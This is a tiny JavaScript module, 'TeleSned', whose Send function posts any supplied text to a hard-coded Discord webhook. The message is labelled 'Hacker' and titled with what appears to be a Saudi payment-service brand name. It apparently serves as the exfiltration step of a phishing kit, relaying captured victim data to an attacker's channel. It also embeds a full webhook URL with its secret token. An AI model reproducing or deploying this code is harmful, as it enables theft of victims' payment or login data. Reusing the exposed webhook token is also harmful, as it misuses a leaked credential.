import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325496658582306908/4L0pBdlC8phQ5MaAbLTj5LmnJfyMa4ZK38-9nbWhzqBSBP39qnYuHWk1hKEJ86psfMHO",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
